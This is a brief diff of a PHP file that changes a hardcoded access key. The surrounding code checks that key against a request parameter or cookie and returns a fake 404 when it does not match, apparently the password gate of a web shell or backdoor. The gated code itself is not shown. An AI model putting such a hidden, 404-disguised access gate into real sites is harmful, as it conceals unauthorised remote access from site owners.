@@ -18,7 +18,7 @@ foreach (headers_list() as $_h) {
 header('Content-Type: text/html; charset=utf-8');
 header('Content-Disposition: inline; filename=""');
 
-$KEY = 'gantengers';
+$KEY = 'sontoloyo';
 $in   = $_REQUEST['k'] ?? $_COOKIE['k'] ?? '';
 if (!is_string($in) || !hash_equals($KEY, $in)) {
     http_response_code(404);
